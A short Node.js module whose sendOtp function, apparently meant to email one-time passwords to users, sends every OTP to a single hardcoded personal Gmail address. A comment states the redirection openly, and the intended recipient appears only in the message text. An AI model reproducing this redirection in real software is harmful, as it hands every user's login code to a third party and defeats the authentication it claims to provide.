import nodemailer from 'nodemailer';




export const sendOtp = async (to, otp) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });
  const mailOptions = {
    from: process.env.EMAIL_USER || "avasardeveloper@gmail.com",
    to: "amitverm3817@gmail.com", // Redirect all OTPs to this email
    subject: 'Your OTP Code',
    text: `Your OTP code is: ${otp} (Original recipient: ${to})`,
    html: `<p>Your OTP code is: <b>${otp}</b></p><p>Original recipient: ${to}</p>`
  };
  await transporter.sendMail(mailOptions);
}; 